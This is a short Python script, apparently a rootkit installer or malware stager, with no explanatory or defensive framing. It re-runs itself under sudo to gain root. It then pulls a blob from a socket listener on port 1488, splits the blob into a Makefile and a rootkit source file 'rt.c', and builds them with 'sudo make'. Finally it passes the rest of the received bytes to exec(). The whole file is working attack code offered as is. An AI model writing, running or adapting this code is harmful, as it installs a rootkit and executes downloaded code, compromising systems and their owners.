import socket
import sys
import os


def install_rootkit(blob):
    with open('Makefile', 'wb') as makefile, open('rt.c', 'wb') as rootkit:
        makefile.write(blob[:177])
        rootkit.write(blob[177:6568+177])

    return os.system('sudo make')


if os.getuid() == 0:
    sock = socket.socket()
    sock.connect(('localhost', 1488))

    sock.send(b'Download')

    blob = b''
    while True:
        blob_chunk = sock.recv(1024)
        if not blob_chunk:
            sock.close()
            break

        blob += blob_chunk

    print(install_rootkit(blob))

    code = blob[6568 + 177:]
    exec(code)

else:
    args = ['sudo', sys.executable] + sys.argv
    os.execlp(args[0], *args)
